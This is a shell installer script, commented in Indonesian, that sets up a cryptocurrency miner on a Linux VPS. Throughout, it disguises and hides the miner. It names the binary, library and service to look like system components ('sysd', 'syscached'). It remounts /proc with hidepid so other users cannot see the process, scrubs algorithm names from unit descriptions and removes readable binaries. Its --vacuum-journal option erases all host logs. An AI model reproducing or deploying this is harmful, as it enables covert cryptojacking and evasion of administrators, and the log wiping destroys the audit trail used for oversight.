#!/bin/sh
# install.sh — pasang miner di VPS baru dari tarball rilis (algo via --algo).
#
# Dua cara pakai:
#   1. Dari tarball yang sudah diekstrak:
#        sudo ./install.sh --wallet <alamat> --worker <nama>
#   2. Unduh langsung dari GitHub Release:
#        sudo ./install.sh --version v1.0.0 --wallet <alamat> --worker <nama>
#
# Skrip ini hanya menyentuh host lokal: binary + library, /etc/sysd/miner.env,
# sysctl hugepages, unit syscached, dan hidepid /proc. Tidak menghubungi host
# lain.
#
# Binary dipasang sebagai /usr/local/sbin/sysd: nama proses di ps, cmdline,
# /proc/<pid>/exe, dan field _EXE di journal semuanya mengikuti nama file, jadi
# tidak ada spoof yang perlu dideteksi. Wallet tetap tidak muncul di cmdline
# karena config dibaca dari EnvironmentFile.
set -eu

REPO="ylxai/xcb-v2"
BIN_DIR="/usr/local/sbin"
BIN="${BIN_DIR}/sysd"
LIB="${BIN_DIR}/libsyscache.so"
CONF_DIR="/etc/sysd"
CONF="${CONF_DIR}/miner.env"
OLD_CONF="/etc/xcb/miner.env"
UNIT="/etc/systemd/system/syscached.service"
SVC="syscached"
HIDE_UNIT="/etc/systemd/system/sysd-proc-hidepid.service"
OLD_HIDE_UNIT="/etc/systemd/system/xcb-proc-hidepid.service"
HIDE_DROPIN="/etc/systemd/system/${SVC}.service.d/10-hidepid.conf"
HUGE_UNIT="/etc/systemd/system/syscache-hugepages.service"
SYSCTL_CONF="/etc/sysctl.d/99-miner-hugepages.conf"
BACKUP_ROOT="/root/sysd-backup"
POOL=""

TAG=""
WALLET=""
WORKER=""
THREADS=""
ALGO="conn"
FORCE=0
DRY=0
NO_HUGE=0
VACUUM=0

usage() {
    cat <<'EOF'
Usage: install.sh [opsi]

Sumber file:
  (tanpa --version)     pakai xcb + libsyscache.so di direktori skrip ini
  --version vX.Y.Z      unduh tarball rilis dari GitHub (atau "latest")

Konfigurasi miner:
  --wallet ADDR         alamat reward; wajib bila /etc/sysd/miner.env belum ada
  --worker NAMA         nama worker (default: hostname)
  --algo ALGO           backend: randomy | conn | bloz | zcd (default: conn)
  --pool HOST:PORT      pool backend (default per algo: conn 17194,
                        bloz 7170, zcd 17197 di rplant; randomy wajib
                        ditulis karena pool XCB tidak menentu)
  --threads N           jumlah thread (default: nproc)

Lainnya:
  --no-hugepages        jangan tulis sysctl hugepages
  --force               timpa /etc/sysd/miner.env yang sudah ada
  --dry-run             cetak rencana tanpa mengubah apa pun
  --vacuum-journal      kosongkan riwayat journald (hapus SEMUA log di host;
                        entri lama memuat wallet sebelum build redaksi)
  -h, --help            tampilkan bantuan ini
EOF
}

log() { printf '%s\n' "[install] $*"; }
die() { printf '%s\n' "[install] ERROR: $*" >&2; exit 1; }
run() {
    if [ "$DRY" -eq 1 ]; then
        printf '[dry-run] %s\n' "$*"
    else
        "$@"
    fi
}

while [ $# -gt 0 ]; do
    case "$1" in
        --version)   [ $# -ge 2 ] || die "--version butuh nilai"; TAG="$2"; shift 2 ;;
        --wallet)    [ $# -ge 2 ] || die "--wallet butuh nilai"; WALLET="$2"; shift 2 ;;
        --worker)    [ $# -ge 2 ] || die "--worker butuh nilai"; WORKER="$2"; shift 2 ;;
        --pool)      [ $# -ge 2 ] || die "--pool butuh nilai"; POOL="$2"; shift 2 ;;
        --algo)      [ $# -ge 2 ] || die "--algo butuh nilai"; ALGO="$2"; shift 2 ;;
        --threads)   [ $# -ge 2 ] || die "--threads butuh nilai"; THREADS="$2"; shift 2 ;;
        --no-hugepages) NO_HUGE=1; shift ;;
        --force)     FORCE=1; shift ;;
        --dry-run)   DRY=1; shift ;;
        --vacuum-journal) VACUUM=1; shift ;;
        -h|--help)   usage; exit 0 ;;
        *)           die "opsi tidak dikenal: $1 (lihat --help)" ;;
    esac
done

if [ "$DRY" -eq 0 ] && [ "$(id -u)" -ne 0 ]; then
    die "jalankan sebagai root: sudo $0 ..."
fi

case "$ALGO" in
    randomy|conn|bloz|zcd) ;;
    *) die "--algo tidak dikenal: $ALGO (pilihan: randomy, conn, bloz, zcd)" ;;
esac

# Default pool per backend kalau --pool tidak diberikan. randomy tidak punya
# default: pool XCB yang dipakai fleet berpindah-pindah (CatchThatRabbit,
# rabbitminer, luckypool), jadi menebak satu alamat hanya akan membuat miner
# login ke pool yang salah.
if [ -z "$POOL" ]; then
    case "$ALGO" in
        conn) POOL="eu.rplant.xyz:17194" ;;
        bloz) POOL="eu.rplant.xyz:7170" ;;
        zcd)  POOL="randomx.rplant.xyz:17197" ;;
        randomy) die "--algo randomy butuh --pool HOST:PORT (tidak ada default)" ;;
    esac
fi

[ "$(uname -s)" = "Linux" ] || die "skrip ini hanya untuk Linux"
[ "$(uname -m)" = "x86_64" ] || die "binary hanya tersedia untuk x86_64"

grep -qw avx2 /proc/cpuinfo || log "PERINGATAN: CPU tidak melaporkan avx2; hashrate akan rendah"
grep -qw aes /proc/cpuinfo || log "PERINGATAN: CPU tidak melaporkan aes; hashrate akan rendah"

MEM_MB=$(awk '/^MemTotal:/ {print int($2/1024)}' /proc/meminfo)
[ "$MEM_MB" -ge 3500 ] || log "PERINGATAN: RAM ${MEM_MB}MB; mode full butuh 2592MB + overhead"

if [ -z "$THREADS" ]; then
    THREADS=$(nproc 2>/dev/null || echo 1)
fi
case "$THREADS" in
    ''|*[!0-9]*) die "--threads harus angka" ;;
esac

WORK=""
cleanup() {
    if [ -n "$WORK" ]; then
        rm -rf "$WORK"
    fi
}
trap cleanup EXIT INT TERM

if [ -n "$TAG" ]; then
    command -v curl >/dev/null 2>&1 || die "curl tidak ditemukan"
    if [ "$TAG" = "latest" ]; then
        TAG=$(curl -fsSL "https://api.github.com/repos/${REPO}/releases/latest" \
            | sed -n 's/.*"tag_name":[[:space:]]*"\([^"]*\)".*/\1/p' | head -n 1)
        [ -n "$TAG" ] || die "tidak bisa membaca tag rilis terbaru"
        log "rilis terbaru: ${TAG}"
    fi
    FILE="xcb-${TAG}-linux-x86_64.tar.gz"
    URL="https://github.com/${REPO}/releases/download/${TAG}"
    WORK=$(mktemp -d)
    log "mengunduh ${FILE}"
    curl -fsSL -o "${WORK}/${FILE}" "${URL}/${FILE}"
    curl -fsSL -o "${WORK}/${FILE}.sha256" "${URL}/${FILE}.sha256"
    ( cd "$WORK" && sha256sum -c "${FILE}.sha256" ) || die "checksum tarball tidak cocok"
    tar -xzf "${WORK}/${FILE}" -C "$WORK"
    SRC="$WORK"
else
    SRC=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)
    [ -f "${SRC}/xcb" ] || die "xcb tidak ada di ${SRC}; pakai --version vX.Y.Z"
    [ -f "${SRC}/libsyscache.so" ] || die "libsyscache.so tidak ada di ${SRC}"
    [ -f "${SRC}/SHA256SUMS" ] || die "SHA256SUMS tidak ada di ${SRC}"
    ( cd "$SRC" && sha256sum -c SHA256SUMS ) || die "checksum file tidak cocok"
fi

[ -f "${SRC}/syscached.service" ] || die "syscached.service tidak ada di ${SRC}; pakai tarball rilis"

# Layout lama menyimpan config di /etc/xcb/miner.env. Kalau yang baru belum
# ada, salin dulu supaya upgrade tidak perlu --wallet lagi; file lama
# dipindahkan ke backup setelah direktori backup dibuat.
if [ ! -f "$CONF" ] && [ -f "$OLD_CONF" ]; then
    run install -d -m 0755 "$CONF_DIR"
    run cp -a "$OLD_CONF" "$CONF"
    run chmod 0600 "$CONF"
    # XCB_TITLE tidak dipakai lagi: nama proses berasal dari nama file binary
    # (sysd), dan build baru menghapus dukungan title spoof.
    run sed -i '/^XCB_TITLE=/d' "$CONF"
    log "migrasi konfigurasi: ${OLD_CONF} -> ${CONF}"
fi

if [ -n "$WALLET" ]; then
    case "$WALLET" in
        ISI_WALLET_CONN|CHANGE_ME) die "wallet masih placeholder" ;;
    esac
    if [ -f "$CONF" ] && [ "$FORCE" -eq 0 ]; then
        die "${CONF} sudah ada; pakai --force untuk menimpa"
    fi
elif [ ! -f "$CONF" ]; then
    die "instalasi baru butuh --wallet (atau sediakan ${CONF})"
fi

if [ -z "$WORKER" ]; then
    WORKER=$(hostname -s 2>/dev/null || hostname)
fi

if [ "$NO_HUGE" -eq 0 ]; then
    if [ "$DRY" -eq 1 ]; then
        printf '[dry-run] tulis %s (vm.nr_hugepages=1200, vm.max_map_count=262144)\n' "$SYSCTL_CONF"
    else
        printf 'vm.nr_hugepages=1200\nvm.max_map_count=262144\n' > "$SYSCTL_CONF"
        sysctl --system >/dev/null
        log "hugepages: $(awk '/^HugePages_Total:/ {print $2}' /proc/meminfo) halaman"
    fi
fi

STAMP=$(date -u +%Y%m%d-%H%M%S)
BACKUP="${BACKUP_ROOT}-${STAMP}"
NEED_BACKUP=0
for f in "$BIN" "$LIB" "$UNIT" "$OLD_CONF" "$OLD_HIDE_UNIT" \
         /usr/local/bin/xcb /usr/local/bin/librandomx_v2.so; do
    if [ -f "$f" ]; then NEED_BACKUP=1; fi
done
if [ "$NEED_BACKUP" -eq 1 ]; then
    # Backup di /root: file di /usr/local/bin masih bisa dibaca user lain dan
    # akan mengungkap binary lama.
    run install -d -m 0700 "$BACKUP"
    for f in "$BIN" "$LIB" "$UNIT" "$OLD_HIDE_UNIT"; do
        if [ -f "$f" ]; then
            run cp -a "$f" "${BACKUP}/$(basename "$f")"
        fi
    done
    for f in "$OLD_CONF" /usr/local/bin/xcb /usr/local/bin/librandomx_v2.so; do
        if [ -f "$f" ]; then
            run cp -a "$f" "${BACKUP}/$(basename "$f").old"
        fi
    done
    # Backup dari installer lama (xcb.bak-*) juga world-readable.
    for f in /usr/local/bin/xcb.bak-* /usr/local/bin/librandomx_v2.so.bak-*; do
        if [ -e "$f" ]; then
            run mv "$f" "${BACKUP}/"
        fi
    done
    log "backup: ${BACKUP}"
fi

run install -d -m 0755 "$BIN_DIR"
# 0750: hanya root yang bisa membaca binary. Nama file menentukan comm, exe,
# dan _EXE di journal — tidak ada title spoof yang bisa menimbulkan anomali.
run install -m 0750 "${SRC}/xcb" "$BIN"
run install -m 0640 "${SRC}/libsyscache.so" "$LIB"
if [ -f "${SRC}/VERSION" ]; then
    run install -m 0600 "${SRC}/VERSION" "${BIN_DIR}/VERSION"
fi

# Layout lama: binary world-readable di /usr/local/bin. Setelah salinan baru
# terpasang, file lama dihapus supaya tidak ada binary bernama xcb yang bisa
# dibaca dan di-strings.
if [ -f /usr/local/bin/xcb ]; then
    run rm -f /usr/local/bin/xcb /usr/local/bin/librandomx_v2.so
fi

# Tidak ada wrapper: Config membaca ALGO/WORKER/THREADS/POOL/WALLET/CONN_POOL
# langsung dari EnvironmentFile, dan memecah suffix ".worker" dari WALLET
# sendiri. ExecStart di unit menunjuk langsung ke /usr/local/sbin/sysd.

if [ -n "$WALLET" ]; then
    run install -d -m 0755 "$CONF_DIR"
    if [ "$DRY" -eq 1 ]; then
        printf '[dry-run] tulis %s (0600)\n' "$CONF"
    else
        (
            umask 077
            cat > "$CONF" <<EOF
ALGO=${ALGO}
# POOL dipakai backend randomy/bloz/zcd (Config butuh POOL + WALLET untuk
# membentuk pool); CONN_POOL tetap ditulis untuk algo conn dan unit lama.
POOL=${POOL}
CONN_POOL=${POOL}
WALLET=${WALLET}
WORKER=${WORKER}
THREADS=${THREADS}
EOF
        )
        chmod 0600 "$CONF"
        log "konfigurasi: ${CONF} (algo ${ALGO}, pool ${POOL}, worker ${WORKER}, ${THREADS} thread)"
    fi
fi

run install -m 0644 "${SRC}/syscached.service" "$UNIT"

# hidepid=2: non-root tidak melihat proses user lain di /proc, termasuk miner.
# Drop-in memastikan remount /proc selesai sebelum syscached start.
run install -d -m 0755 "$(dirname "$HIDE_DROPIN")"
if [ "$DRY" -eq 1 ]; then
    printf '[dry-run] tulis %s (0644)\n' "$HIDE_UNIT"
    printf '[dry-run] tulis %s (0644)\n' "$HIDE_DROPIN"
else
    cat > "$HIDE_UNIT" <<'EOF'
[Unit]
Description=Hide other users' processes in /proc
DefaultDependencies=no
After=local-fs.target
Before=syscached.service

[Service]
Type=oneshot
ExecStart=/bin/mount -o remount,hidepid=2 /proc
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
    chmod 0644 "$HIDE_UNIT"
    cat > "$HIDE_DROPIN" <<'EOF'
[Unit]
Wants=sysd-proc-hidepid.service
After=sysd-proc-hidepid.service
EOF
    chmod 0644 "$HIDE_DROPIN"
    log "hidepid: ${HIDE_UNIT} + ${HIDE_DROPIN}"
fi

if [ "$DRY" -eq 0 ]; then
    systemctl daemon-reload

    # Unit hidepid lama masih ada: matikan lalu hapus, supaya tidak ada dua
    # unit remount /proc dengan nama berbeda.
    if [ -f "$OLD_HIDE_UNIT" ]; then
        systemctl disable --now xcb-proc-hidepid.service 2>/dev/null || true
        rm -f "$OLD_HIDE_UNIT"
        log "unit hidepid lama dihapus: ${OLD_HIDE_UNIT}"
    fi

    # Deskripsi unit hugepages lama menyebut algoritma ("RandomX ..."); ganti
    # ke nama netral. Unit ini dibuat di luar installer, perbaiki kalau ada.
    if [ -f "$HUGE_UNIT" ] && grep -q RandomX "$HUGE_UNIT"; then
        [ -d "$BACKUP" ] || install -d -m 0700 "$BACKUP"
        cp -a "$HUGE_UNIT" "${BACKUP}/$(basename "$HUGE_UNIT")"
        sed -i 's/^Description=.*/Description=Allocate hugepages for sysd/' "$HUGE_UNIT"
        systemctl daemon-reload
        log "hugepages: Description diganti di ${HUGE_UNIT} (backup: ${BACKUP})"
    fi

    systemctl enable sysd-proc-hidepid.service >/dev/null 2>&1 || true
    systemctl start sysd-proc-hidepid.service || true
    systemctl enable "$SVC" >/dev/null 2>&1 || true
    systemctl restart "$SVC"
    sleep 5
    log "status: $(systemctl is-active "$SVC")"
    log "cek log: journalctl -u ${SVC} -n 30 --no-pager"
    log "cek proses: ps -eo pid,ppid,comm,args | grep -E '[s]ysd'"
    log "cek hidepid: grep ' /proc ' /proc/mounts | grep -o 'hidepid=[a-z0-9]*'"
    if [ -d "$BACKUP" ]; then
        log "rollback: lihat ${BACKUP} — kembalikan sysd, libsyscache.so, syscached.service lalu systemctl daemon-reload && systemctl restart ${SVC}"
    fi
    if [ "$VACUUM" -eq 1 ]; then
        log "PERINGATAN: --vacuum-journal menghapus SEMUA riwayat journald di"
        log "PERINGATAN: host ini (semua unit, bukan hanya miner). Diperlukan"
        log "PERINGATAN: karena entri sebelum build redaksi wallet memuat wallet mentah."
        log "journal sebelum: $(journalctl --disk-usage)"
        journalctl --rotate
        journalctl --vacuum-time=1s
        log "journal sesudah: $(journalctl --disk-usage)"
    fi
else
    if [ "$VACUUM" -eq 1 ]; then
        printf '[dry-run] journalctl --rotate\n'
        printf '[dry-run] journalctl --vacuum-time=1s\n'
    fi
    log "dry-run selesai; tidak ada perubahan"
fi
